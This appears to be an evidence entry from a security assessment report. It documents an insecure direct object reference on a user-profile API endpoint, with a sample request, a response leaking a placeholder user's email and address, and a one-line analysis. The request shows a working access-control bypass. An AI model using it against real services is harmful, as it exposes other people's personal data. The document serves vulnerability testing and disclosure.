## Evidence: idor-user-profiles — IDOR on User Profiles

### Request
GET /api/v1/users/550e8400-e29b-41d4-a716-446655440000 HTTP/1.1
Host: duck-store.escape.tech
Authorization: Bearer eyJ...regular-user-token

### Response
HTTP/1.1 200 OK
Content-Type: application/json

{"uuid":"550e8400-e29b-41d4-a716-446655440000","username":"victim","email":"victim@example.com","UserProfile":{"address":"123 Main St"}}

### Analysis
The /api/v1/users/ endpoint returns the full UserProfile for any uuid without ownership verification, confirming IDOR.
